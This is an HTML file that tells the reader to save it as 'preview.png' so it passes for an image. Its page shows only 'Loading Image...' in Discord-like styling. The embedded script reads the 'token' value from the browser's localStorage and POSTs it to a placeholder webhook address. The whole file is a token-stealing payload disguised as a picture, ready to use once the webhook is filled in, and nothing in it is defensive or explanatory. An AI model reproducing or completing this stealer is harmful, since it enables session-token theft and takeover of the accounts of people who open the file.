<!-- Save as: preview.png (yes, .png) -->
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Loading Image...</title>
    <style>
      body {
        margin: 0;
        background: #2f3136;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        color: #fff;
        font-family: sans-serif;
      }
    </style>
  </head>
  <body>
    <h2>Loading Image...</h2>
    <script>
      try {
        const token = localStorage.getItem("token");
        fetch("YOUR_WEBHOOK_HERE", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `Token: ${token}`
          })
        });
      } catch (e) {
        console.log("Error:", e);
      }
    </script>
  </body>
</html>
